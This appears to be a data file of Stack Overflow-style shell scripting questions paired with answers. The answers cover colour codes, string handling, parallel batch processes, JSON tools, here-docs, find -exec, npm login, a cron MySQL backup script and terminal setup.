    "Colored shell script output library": "Here is an modified snippet from my dotfiles that should do what you want\nRCol='\\e[0m'    # Text Reset\n\n# Regular           Bold                Underline           High Intensity      BoldHigh Intens     Background          High Intensity Backgrounds\nBla='\\e[0;30m';     BBla='\\e[1;30m';    UBla='\\e[4;30m';    IBla='\\e[0;90m';    BIBla='\\e[1;90m';   On_Bla='\\e[40m';    On_IBla='\\e[0;100m';\nRed='\\e[0;31m';     BRed='\\e[1;31m';    URed='\\e[4;31m';    IRed='\\e[0;91m';    BIRed='\\e[1;91m';   On_Red='\\e[41m';    On_IRed='\\e[0;101m';\nGre='\\e[0;32m';     BGre='\\e[1;32m';    UGre='\\e[4;32m';    IGre='\\e[0;92m';    BIGre='\\e[1;92m';   On_Gre='\\e[42m';    On_IGre='\\e[0;102m';\nYel='\\e[0;33m';     BYel='\\e[1;33m';    UYel='\\e[4;33m';    IYel='\\e[0;93m';    BIYel='\\e[1;93m';   On_Yel='\\e[43m';    On_IYel='\\e[0;103m';\nBlu='\\e[0;34m';     BBlu='\\e[1;34m';    UBlu='\\e[4;34m';    IBlu='\\e[0;94m';    BIBlu='\\e[1;94m';   On_Blu='\\e[44m';    On_IBlu='\\e[0;104m';\nPur='\\e[0;35m';     BPur='\\e[1;35m';    UPur='\\e[4;35m';    IPur='\\e[0;95m';    BIPur='\\e[1;95m';   On_Pur='\\e[45m';    On_IPur='\\e[0;105m';\nCya='\\e[0;36m';     BCya='\\e[1;36m';    UCya='\\e[4;36m';    ICya='\\e[0;96m';    BICya='\\e[1;96m';   On_Cya='\\e[46m';    On_ICya='\\e[0;106m';\nWhi='\\e[0;37m';     BWhi='\\e[1;37m';    UWhi='\\e[4;37m';    IWhi='\\e[0;97m';    BIWhi='\\e[1;97m';   On_Whi='\\e[47m';    On_IWhi='\\e[0;107m';\nThen you can just echo -e \"${Blu}blue ${Red}red ${RCol}etc....\"",
    "Position of a string within a string using Linux shell script?": "With bash\na=\"The cat sat on the mat\"\nb=cat\nstrindex() { \n  x=\"${1%%\"$2\"*}\"\n  [[ \"$x\" = \"$1\" ]] && echo -1 || echo \"${#x}\"\n}\nstrindex \"$a\" \"$b\"   # prints 4\nstrindex \"$a\" foo    # prints -1\nstrindex \"$a\" \"ca*\"  # prints -1",
    "How to remove filename prefix with a Posix shell": "You said POSIX shells which would include BASH, Kornshell, Ash, Zsh, and Dash. Fortunately, all of these shells do pattern filtering on variable values.\nPatterns are what you use when you specify files with things like * on the Unix/Linux command line:\n$ ls *.sh  # Lists all files with a `.sh` suffix\nThese POSIX shells use four different pattern filtering:\n${var#pattern} - Removes smallest string from the left side that matches the pattern.\n${var##pattern} - Removes the largest string from the left side that matches the pattern.\n${var%pattern} - Removes the smallest string from the right side that matches the pattern.\n${var%%pattern} - Removes the largest string from the right side that matches the pattern.\nHere are a few examples:\nfoo=\"foo-bar-foobar\"\necho ${foo#*-}   # echoes 'bar-foobar'  (Removes 'foo-' because that matches '*-')\necho ${foo##*-}  # echoes 'foobar' (Removes 'foo-bar-')\necho ${foo%-*}   # echoes 'foo-bar'\necho ${foo%%-*}  # echoes 'foo'\nYou didn't really explain what you want, and you didn't include any code example, so it's hard to come up with something that will do what you want. However, using pattern filtering, you can probably figure out exactly what you want to do with your file names.\nfile_name=\"XY TD-11212239.pdf\"\nmv \"$file_name\" \"${file_name#*-}\" # Removes everything from up to the first dash",
    "removing new line character from incoming stream using sed": "To remove newlines, use tr:\ntr -d '\\n'\nIf you want to replace each newline with a single space:\ntr '\\n' ' '\nThe error ba: Event not found is coming from csh, and is due to csh trying to match !ba in your history list. You can escape the ! and write the command:\nsed ':a;N;$\\!ba;s/\\n/ /g'  # Suitable for csh only!!\nbut sed is the wrong tool for this, and you would be better off using a shell that handles quoted strings more reasonably. That is, stop using csh and start using bash.",
    "Parallel execution of shell processes": "Edit - I modified the script to optionally display the output of each process\nHere is a native batch solution that reliably runs a list of commands in parallel, never launching more than n processes at a time.\nIt even has a mechanism built in to distribute the processes to specific CPUs or remote machines via PSEXEC, but I haven't tested that feature.\nThe trick to make this work is to START each command through a CMD process that redirects either stdout or an undefined handle to a lock file. The process will maintain an exclusive lock on the file until it terminates. It doesn't matter how the process terminates (normal exit, crash, killed process), the lock will be released as soon as it does.\nThe master script can test if the process is still active by attempting to redirect to the same lock file. The redirection will fail if the process is still active, succeed if it has terminated.\nBy default, the script ignores the output of each process. If started with the /O option as the 1st parameter, then it displays the output of each process, without interleaving.\nMy demo sets the process limit to 4, and simply runs a series of PING commands of varying length.\nI've tested this on XP, Vista, and Windows 7.\n@echo off\nsetlocal enableDelayedExpansion\n\n:: Display the output of each process if the /O option is used\n:: else ignore the output of each process\nif /i \"%~1\" equ \"/O\" (\n  set \"lockHandle=1\"\n  set \"showOutput=1\"\n) else (\n  set \"lockHandle=1^>nul 9\"\n  set \"showOutput=\"\n)\n\n:: The list of commands could come from anywhere such as another file\n:: or the output of another command. For this demo I will list the\n:: commands within this script - Each command is prefixed with :::\n::: ping /n 05 ::1\n::: ping /n 20 ::1\n::: ping /n 10 ::1\n::: ping /n 15 ::1\n::: ping /n 07 ::1\n::: ping /n 05 ::1\n::: ping /n 20 ::1\n::: ping /n 10 ::1\n::: ping /n 15 ::1\n::: ping /n 07 ::1\n\n:: Define the maximum number of parallel processes to run.\n:: Each process number can optionally be assigned to a particular server\n:: and/or cpu via psexec specs (untested).\nset \"maxProc=4\"\n\n:: Optional - Define CPU targets in terms of PSEXEC specs\n::           (everything but the command)\n::\n:: If a CPU is not defined for a proc, then it will be run on the local machine.\n:: I haven't tested this feature, but it seems like it should work.\n::\n:: set cpu1=psexec \\\\server1 ...\n:: set cpu2=psexec \\\\server1 ...\n:: set cpu3=psexec \\\\server2 ...\n:: etc.\n\n:: For this demo force all CPU specs to undefined (local machine)\nfor /l %%N in (1 1 %maxProc%) do set \"cpu%%N=\"\n\n:: Get a unique base lock name for this particular instantiation.\n:: Incorporate a timestamp from WMIC if possible, but don't fail if\n:: WMIC not available. Also incorporate a random number.\n  set \"lock=\"\n  for /f \"skip=1 delims=-+ \" %%T in ('2^>nul wmic os get localdatetime') do (\n    set \"lock=%%T\"\n    goto :break\n  )\n  :break\n  set \"lock=%temp%\\lock%lock%_%random%_\"\n\n:: Initialize the counters\n  set /a \"startCount=0, endCount=0\"\n\n:: Clear any existing end flags\n  for /l %%N in (1 1 %maxProc%) do set \"endProc%%N=\"\n\n:: Launch the commands in a loop\n:: Modify the IN () clause as needed to retrieve the list of commands\n  set launch=1\n  for /f \"tokens=* delims=:\" %%A in ('findstr /b \":::\" \"%~f0\"') do (\n    if !startCount! lss %maxProc% (\n      set /a \"startCount+=1, nextProc=startCount\"\n    ) else (\n      call :wait\n    )\n    set cmd!nextProc!=%%A\n    if defined showOutput echo -------------------------------------------------------------------------------\n    echo !time! - proc!nextProc!: starting %%A\n    2>nul del %lock%!nextProc!\n    %= Redirect the lock handle to the lock file. The CMD process will     =%\n    %= maintain an exclusive lock on the lock file until the process ends. =%\n    start /b \"\" cmd /c %lockHandle%^>\"%lock%!nextProc!\" 2^>^&1 !cpu%%N! %%A\n  )\n  set \"launch=\"\n\n:wait\n:: Wait for procs to finish in a loop\n:: If still launching then return as soon as a proc ends\n:: else wait for all procs to finish\n  :: redirect stderr to null to suppress any error message if redirection\n  :: within the loop fails.\n  for /l %%N in (1 1 %startCount%) do 2>nul (\n    %= Redirect an unused file handle to the lock file. If the process is    =%\n    %= still running then redirection will fail and the IF body will not run =%\n    if not defined endProc%%N if exist \"%lock%%%N\" 9>>\"%lock%%%N\" (\n      %= Made it inside the IF body so the process must have finished =%\n      if defined showOutput echo ===============================================================================\n      echo !time! - proc%%N: finished !cmd%%N!\n      if defined showOutput type \"%lock%%%N\"\n      if defined launch (\n        set nextProc=%%N\n        exit /b\n      )\n      set /a \"endCount+=1, endProc%%N=1\"\n    )\n  )\n  if %endCount% lss %startCount% (\n    1>nul 2>nul ping /n 2 ::1\n    goto :wait\n  )\n\n2>nul del %lock%*\nif defined showOutput echo ===============================================================================\necho Thats all folks^^!\nHere is output from a sample run that ignores process output\n12:24:07.52 - proc1: starting  ping /n 05 ::1\n12:24:07.52 - proc2: starting  ping /n 20 ::1\n12:24:07.53 - proc3: starting  ping /n 10 ::1\n12:24:07.54 - proc4: starting  ping /n 15 ::1\n12:24:11.60 - proc1: finished  ping /n 05 ::1\n12:24:11.60 - proc1: starting  ping /n 07 ::1\n12:24:16.66 - proc3: finished  ping /n 10 ::1\n12:24:16.66 - proc3: starting  ping /n 05 ::1\n12:24:17.68 - proc1: finished  ping /n 07 ::1\n12:24:17.68 - proc1: starting  ping /n 20 ::1\n12:24:20.72 - proc3: finished  ping /n 05 ::1\n12:24:20.72 - proc3: starting  ping /n 10 ::1\n12:24:21.75 - proc4: finished  ping /n 15 ::1\n12:24:21.75 - proc4: starting  ping /n 15 ::1\n12:24:26.82 - proc2: finished  ping /n 20 ::1\n12:24:26.82 - proc2: starting  ping /n 07 ::1\n12:24:29.86 - proc3: finished  ping /n 10 ::1\n12:24:32.89 - proc2: finished  ping /n 07 ::1\n12:24:35.92 - proc4: finished  ping /n 15 ::1\n12:24:36.93 - proc1: finished  ping /n 20 ::1\nThats all folks!\nHere is the output if run with the /O option showing process output\n-------------------------------------------------------------------------------\n12:24:51.02 - proc1: starting  ping /n 05 ::1\n-------------------------------------------------------------------------------\n12:24:51.02 - proc2: starting  ping /n 20 ::1\n-------------------------------------------------------------------------------\n12:24:51.03 - proc3: starting  ping /n 10 ::1\n-------------------------------------------------------------------------------\n12:24:51.04 - proc4: starting  ping /n 15 ::1\n===============================================================================\n12:24:55.10 - proc1: finished  ping /n 05 ::1\n\nPinging ::1 with 32 bytes of data:\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\n\nPing statistics for ::1:\n    Packets: Sent = 5, Received = 5, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms\n-------------------------------------------------------------------------------\n12:24:55.10 - proc1: starting  ping /n 07 ::1\n===============================================================================\n12:25:00.17 - proc3: finished  ping /n 10 ::1\n\nPinging ::1 with 32 bytes of data:\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\n\nPing statistics for ::1:\n    Packets: Sent = 10, Received = 10, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms\n-------------------------------------------------------------------------------\n12:25:00.19 - proc3: starting  ping /n 05 ::1\n===============================================================================\n12:25:01.22 - proc1: finished  ping /n 07 ::1\n\nPinging ::1 with 32 bytes of data:\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\n\nPing statistics for ::1:\n    Packets: Sent = 7, Received = 7, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms\n-------------------------------------------------------------------------------\n12:25:01.23 - proc1: starting  ping /n 20 ::1\n===============================================================================\n12:25:04.27 - proc3: finished  ping /n 05 ::1\n\nPinging ::1 with 32 bytes of data:\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\n\nPing statistics for ::1:\n    Packets: Sent = 5, Received = 5, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms\n-------------------------------------------------------------------------------\n12:25:04.28 - proc3: starting  ping /n 10 ::1\n===============================================================================\n12:25:05.30 - proc4: finished  ping /n 15 ::1\n\nPinging ::1 with 32 bytes of data:\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\n\nPing statistics for ::1:\n    Packets: Sent = 15, Received = 15, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms\n-------------------------------------------------------------------------------\n12:25:05.32 - proc4: starting  ping /n 15 ::1\n===============================================================================\n12:25:10.38 - proc2: finished  ping /n 20 ::1\n\nPinging ::1 with 32 bytes of data:\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\n\nPing statistics for ::1:\n    Packets: Sent = 20, Received = 20, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms\n-------------------------------------------------------------------------------\n12:25:10.40 - proc2: starting  ping /n 07 ::1\n===============================================================================\n12:25:13.44 - proc3: finished  ping /n 10 ::1\n\nPinging ::1 with 32 bytes of data:\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\n\nPing statistics for ::1:\n    Packets: Sent = 10, Received = 10, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms\n===============================================================================\n12:25:16.48 - proc2: finished  ping /n 07 ::1\n\nPinging ::1 with 32 bytes of data:\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\n\nPing statistics for ::1:\n    Packets: Sent = 7, Received = 7, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms\n===============================================================================\n12:25:19.52 - proc4: finished  ping /n 15 ::1\n\nPinging ::1 with 32 bytes of data:\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\n\nPing statistics for ::1:\n    Packets: Sent = 15, Received = 15, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms\n===============================================================================\n12:25:20.54 - proc1: finished  ping /n 20 ::1\n\nPinging ::1 with 32 bytes of data:\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\nReply from ::1: time<1ms\n\nPing statistics for ::1:\n    Packets: Sent = 20, Received = 20, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms\n===============================================================================\nThats all folks!",
    "How to get yesterday and day before yesterday in linux?": "Here is another one way,\nFor yesterday,\ndate -d '-1 day' '+%Y%d%m'\nFor day before yesterday,\ndate -d '-2 day' '+%Y%d%m'",
    "How to store an output of shell script to a variable in Unix? [duplicate]": "Two simple examples to capture output the pwd command:\n$ b=$(pwd)\n$ echo $b\n/home/user1\nor\n$ a=`pwd`\n$ echo $a\n/home/user1\nThe first way is preferred. Note that there can't be any spaces after the = for this to work.\nExample using a short script:\n#!/bin/bash\n\necho \"hi there\"\nthen:\n$ ./so.sh\nhi there\n$ a=$(so.sh)\n$ echo $a\nhi there\nIn general a more flexible approach would be to return an exit value from the command and use it for further processing, though sometimes we just may want to capture the simple output from a command.",
    "find string inside a gzipped file in a folder": "zgrep will look in gzipped files, has a -R recursive option, and a -H show me the filename option:\nzgrep -R --include=*.gz -H \"pattern match\" .\nOS specific commands as not all arguments work across the board:\nMac 10.5+: zgrep -R --include=\\*.gz -H \"pattern match\" .\nUbuntu 16+: zgrep -i -H \"pattern match\" *.gz",
    "Validate JSON file syntax in shell script without installing any package": "I have yet to find a system where python -mjson.tool doesn't work. So you can do:\npython -mjson.tool \"$somefile\" > /dev/null\nThe exit code will be nonzero and you get the parse error on stderr if the file is not valid JSON.\nNote: The Python libraries don't follow the JSON spec and allow NaN and Infinity as values. So using json.tool will let some errors slip through. Still it's good enough for my use case of catching errors in human-written documents early.",
    "How can a shell function know if it is running within a virtualenv?": "if [[ \"$VIRTUAL_ENV\" != \"\" ]]\nthen\n  INVENV=1\nelse\n  INVENV=0\nfi\n// or shorter if you like:\n[[ \"$VIRTUAL_ENV\" == \"\" ]]; INVENV=$?\nEDIT: as @ThiefMaster mentions in the comments, in certain conditions (for instance, when starting a new shell \u2013 perhaps in tmux or screen \u2013 from within an active virtualenv) this check may fail (however, starting new shells from within a virtualenv may cause other issues as well, I wouldn't recommend it).",
    "Is there a static analysis tool like Lint or Perl::Critic for shell scripts?": "I found shellcheck: it tests for common errors in quoting and other things you overlook (\"because it works\").",
    "Linux head/tail with offset": "From man tail:\n   -n, --lines=K\n        output the last K lines, instead of the last 10; \n        or use -n +K to output lines starting with the Kth\nYou can therefore use ... | tail -n +2 | head -n 3 to get 3 lines starting from line 2.\nNon-head/tail methods include sed -n \"2,4p\" and awk \"NR >= 2 && NR <= 4\".",
    "How to do an unpretty print on pretty JSON file in shell >> serial string JSON >> ES _bulk?": "You can try the great jq tool for parsing JSON in the shell. To de-pretty print with jq, you can use either method below:\ncat pretty-printed.json | jq -c .\njq -c . pretty-printed.json\nthe -c (or --compact-output) tells it to not pretty print (which is the default). The \".\" tells it to return the JSON content \"as is\" unmodified other than the reformatting. It gets dumped back to stdout, so you can redirect output or pipe it to something else.\nP.S. I was looking to address the same problem and came to this option.",
    "Bash: Echoing a echo command with a variable in bash": "The immediate problem is you have is with quoting: by using double quotes (\"...\"), your variable references are instantly expanded, which is probably not what you want.\nUse single quotes instead - strings inside single quotes are not expanded or interpreted in any way by the shell.\n(If you want selective expansion inside a string - i.e., expand some variable references, but not others - do use double quotes, but prefix the $ of references you do not want expanded with \\; e.g., \\$var).\nHowever, you're better off using a single here-doc[ument], which allows you to create multi-line stdin input on the spot, bracketed by two instances of a self-chosen delimiter, the opening one prefixed by <<, and the closing one on a line by itself - starting at the very first column; search for Here Documents in man bash or at http://www.gnu.org/software/bash/manual/html_node/Redirections.html.\nIf you quote the here-doc delimiter (EOF in the code below), variable references are also not expanded. As @chepner points out, you're free to choose the method of quoting in this case: enclose the delimiter in single quotes or double quotes, or even simply arbitrarily escape one character in the delimiter with \\:\necho \"creating new script file.\"\n\ncat <<'EOF'  > \"$servfile\"\n#!/bin/bash\nread -p \"Please enter a service: \" ser\nservicetest=`getsebool -a | grep ${ser}` \nif [ $servicetest > /dev/null ]; then \n  echo \"we are now going to work with ${ser}\"\nelse\n  exit 1\nfi\nEOF\nAs @BruceK notes, you can prefix your here-doc delimiter with - (applied to this example: <<-\"EOF\") in order to have leading tabs stripped, allowing for indentation that makes the actual content of the here-doc easier to discern. Note, however, that this only works with actual tab characters, not leading spaces.\nEmploying this technique combined with the afterthoughts regarding the script's content below, we get (again, note that actual tab chars. must be used to lead each here-doc content line for them to get stripped):\ncat <<-'EOF' > \"$servfile\"\n    #!/bin/bash\n    read -p \"Please enter a service name: \" ser\n    if [[ -n $(getsebool -a | grep \"${ser}\") ]]; then \n      echo \"We are now going to work with ${ser}.\"\n    else\n      exit 1\n    fi\nEOF\nFinally, note that in bash even normal single- or double-quoted strings can span multiple lines, but you won't get the benefits of tab-stripping or line-block scoping, as everything inside the quotes becomes part of the string.\nThus, note how in the following #!/bin/bash has to follow the opening ' immediately in order to become the first line of output:\necho '#!/bin/bash\nread -p \"Please enter a service: \" ser\nservicetest=$(getsebool -a | grep \"${ser}\")\nif [[ -n $servicetest ]]; then \n  echo \"we are now going to work with ${ser}\"\nelse\n  exit 1\nfi' > \"$servfile\"\nAfterthoughts regarding the contents of your script:\nThe syntax $(...) is preferred over `...` for command substitution nowadays.\nYou should double-quote ${ser} in the grep command, as the command will likely break if the value contains embedded spaces (alternatively, make sure that the valued read contains no spaces or other shell metacharacters).\nUse [[ -n $servicetest ]] to test whether $servicetest is empty (or perform the command substitution directly inside the conditional) - [[ ... ]] - the preferred form in bash - protects you from breaking the conditional if the $servicetest happens to have embedded spaces; there's NEVER a need to suppress stdout output inside a conditional (whether [ ... ] or [[ ... ]], as no stdout output is passed through; thus, the > /dev/null is redundant (that said, with a command substitution inside a conditional, stderr output IS passed through).",
    "exit function stack without exiting shell": "To exit the function stack without exiting shell one can use the command:\nkill -INT $$\nAs pizza stated, this is like pressing Ctrl-C, which will stop the current script from running and drop you down to the command prompt.\n    Note: the only reason I didn't select pizza's answer is because this was buried in his/her answer and not answered directly.",
    "set -e and set -x in shell script": "set -x\nPrint shell command before execute it. This feature help programmers to track their shell script.\nset -e\nIf the return code of one command is not 0 and the caller does not check it, the shell script will exit. This feature make shell script robust.\nset -e and set -x often appear at the head of shell script:\nset -x\nset -e\n\necho \"I am a shell script.\"\nOr use as shell command:\nsh -xe shell_script.sh\nReference: http://julio.meroh.net/2010/01/set-e-and-set-x.html",
    "Use current filename (\"{}\") multiple times in \"find -exec\"?": "Try:\nfind /directory -name \"*pattern*\" -exec sh -c 'cut -f8 {} > {}.txt' \\;\nBut be aware that some versions of find require {} to be a distinct argument, and will not expand {} to a filename otherwise. You can work around that with:\nfind /directory -name \"*pattern*\" -exec sh -c 'cut -f8 $0 > $0.txt' {} \\;\n(this alternate command will put the output file in the subdirectory which contains the matched file. If desired, you could avoid that by redirecting to ${0#*/}\nThe issue is that find is not doing the redirection, the shell is. Your command is exactly equivalent to:\n# Sample of INCORRECT code\nfind /directory -name \"*pattern*\" -exec cut -f8 {} \\; > {}.txt\nNote the following from the standard:\nIf more than one argument containing only the two characters \"{}\" is present, the behavior is unspecified.\nIf a utility_name or argument string contains the two characters \"{}\" , but not just the two characters \"{}\" , it is implementation-defined whether find replaces those two characters or uses the string without change.",
    "How to curl using IPv6 address?": "after some testing, I find the following command works:\n$ curl -g -6 'http://[fe80::3ad1:35ff:fe08:cd%eth0]:80/'\ninterface 'eth0' is the interface with ipv6 enabled, so you may need to replace it with something else.\nand just in case, the telnet command to test ipv6:\n$ telnet -6 fe80::3ad1:35ff:fe08:cd%eth0 80",
    "How to bring an Orphaned Background Process back to Foreground?": "If you have started the process without using \"screen\" command then you cannot take over that process. Basically you cannot take over a process that was started in a different shell.\nWhen your session is terminated all the bg process will go the detached state. Though you might be able to see the details of such process you cannot fg them to a shell from login afterwards",
    "Give credentials to npm login command line": "I found an npm package for this:\nInstall npm-cli-login and in the terminal/scripts use it as below:\nnpm-cli-login -u testUser -p testPass -e test@example.com\nI found two other ways to pass the credentials without the need to use an external command, but be aware that these commands might not work in environments such as Jenkins.\nCommands:\n# First way\necho -e 'USERNAME\\nPASSWORD\\nEMAIL' | npm login -e EMAIL -r REGISTRY\n\n# Second way\nnpm login -e EMAIL -r REGISTRY << EOF\nUSERNAME\nPASSWORD\nEMAIL\nEOF",
    "Linux shell script for database backup": "After hours and hours work, I created a solution like the below. I copy paste for other people that can benefit.\nFirst create a script file and give this file executable permission.\n# cd /etc/cron.daily/\n# touch /etc/cron.daily/dbbackup-daily.sh\n# chmod 755 /etc/cron.daily/dbbackup-daily.sh\n# vi /etc/cron.daily/dbbackup-daily.sh\nThen copy following lines into file with Shift+Ins\n#!/bin/sh\nnow=\"$(date +'%d_%m_%Y_%H_%M_%S')\"\nfilename=\"db_backup_$now\".gz\nbackupfolder=\"/var/www/vhosts/example.com/httpdocs/backups\"\nfullpathbackupfile=\"$backupfolder/$filename\"\nlogfile=\"$backupfolder/\"backup_log_\"$(date +'%Y_%m')\".txt\necho \"mysqldump started at $(date +'%d-%m-%Y %H:%M:%S')\" >> \"$logfile\"\nmysqldump --user=mydbuser --password=mypass --default-character-set=utf8 mydatabase | gzip > \"$fullpathbackupfile\"\necho \"mysqldump finished at $(date +'%d-%m-%Y %H:%M:%S')\" >> \"$logfile\"\nchown myuser \"$fullpathbackupfile\"\nchown myuser \"$logfile\"\necho \"file permission changed\" >> \"$logfile\"\nfind \"$backupfolder\" -name db_backup_* -mtime +8 -exec rm {} \\;\necho \"old files deleted\" >> \"$logfile\"\necho \"operation finished at $(date +'%d-%m-%Y %H:%M:%S')\" >> \"$logfile\"\necho \"*****************\" >> \"$logfile\"\nexit 0\nEdit:\nIf you use InnoDB and backup takes too much time, you can add \"single-transaction\" argument to prevent locking. So mysqldump line will be like this:\nmysqldump --user=mydbuser --password=mypass --default-character-set=utf8\n          --single-transaction mydatabase | gzip > \"$fullpathbackupfile\"",
    "How can I run shell (terminal) in Google Colab?": "You can use jQuery Terminal Emulator backed with google.colab.kernel.invokeFunction\nHere's an example notebook.\nThe key part is here, where you back it with shell function.\ndef shell(command):\n  return JSON([getoutput(command)])\noutput.register_callback('shell', shell)\nAnd here's how you use invokeFunction:\ntry {\n    let res = await google.colab.kernel.invokeFunction('shell', [command])\n    let out = res.data['application/json'][0]\n    this.echo(new String(out))\n} catch(e) {\n    this.error(new String(e));\n}\nHere's a screenshot.\nUpdate (7/2020)\nI have taken @Anant's answer and add it into my library. Now you can run console easily with just\n!pip install kora\nfrom kora import console\nconsole.start()  # and click link\nUpdate (12/2020)\nIf you subscribe to Colab Pro, terminal is now available. Just click the 'Terminal' icon on the left pane.",
    "How do I integrate MSYS2 shell into Visual studio code on Window?": "Answers here are from the old method which is now (July 2021) deprecated in VSCode the new suggested way, add this to settings.json:\n\"terminal.integrated.profiles.windows\": {\n    \"PowerShell\": {\n      \"source\": \"PowerShell\",\n      \"icon\": \"terminal-powershell\"\n    },\n    \"Command Prompt\": {\n      \"path\": [\n        \"${env:windir}\\\\Sysnative\\\\cmd.exe\",\n        \"${env:windir}\\\\System32\\\\cmd.exe\"\n      ],\n      \"args\": [],\n      \"icon\": \"terminal-cmd\"\n    },\n    \"Git Bash\": {\n      \"source\": \"Git Bash\"\n    },\n    \"MSYS2\": {\n      \"path\": \"C:\\\\msys64\\\\usr\\\\bin\\\\bash.exe\",\n      \"args\": [\n        \"--login\",\n        \"-i\"\n      ],\n      \"env\": {\n        \"MSYSTEM\": \"MINGW64\",\n        \"CHERE_INVOKING\": \"1\"\n      }\n    }\n  },\nreference: integrated-terminal#_configuring-profiles",
    "Get size of terminal window (rows/columns)": "On Windows, use the following code to print the size of the console window (borrowed from quantum's answer here):\n#include <windows.h>\n\nint main(int argc, char *argv[]) \n{\n    CONSOLE_SCREEN_BUFFER_INFO csbi;\n    int columns, rows;\n  \n    GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbi);\n    columns = csbi.srWindow.Right - csbi.srWindow.Left + 1;\n    rows = csbi.srWindow.Bottom - csbi.srWindow.Top + 1;\n  \n    printf(\"columns: %d\\n\", columns);\n    printf(\"rows: %d\\n\", rows);\n    return 0;\n}\nOn Linux, use the following instead (borrowed from John T's answer here):\n#include <sys/ioctl.h>\n#include <stdio.h>\n#include <unistd.h>\n\nint main (int argc, char **argv)\n{\n    struct winsize w;\n    ioctl(STDOUT_FILENO, TIOCGWINSZ, &w);\n\n    printf (\"lines %d\\n\", w.ws_row);\n    printf (\"columns %d\\n\", w.ws_col);\n    return 0;  // make sure your main returns int\n}",
    "How to generate a 2hour-long blank video": "You can use ffmpeg for this:\nffmpeg -t 7200 -s 640x480 -f rawvideo -pix_fmt rgb24 -r 25 -i /dev/zero empty.mpeg\nUPDATE:\n-t:       length of the video (in H:m:s format 00:00:00 or in seconds 0.000)\n-s:       frame size\n-f:       video format\n-pix_fmt: pixel format\n-r:       fps\n-i:       input",
    "how to write a process-pool bash shell": "Use xargs:\nxargs -P <maximum-number-of-process-at-a-time> -n <arguments-per-process> <command>\nDetails here.",
    "Copy multiple files from one directory to another from Linux shell [closed]": "I guess you are looking for brace expansion:\ncp /home/ankur/folder/{file1,file2} /home/ankur/dest\ntake a look here, it would be helpful for you if you want to handle multiple files once :\nhttp://www.tldp.org/LDP/abs/html/globbingref.html\ntab completion with zsh...",
    "Cannot push from gitlab-ci.yml": "",
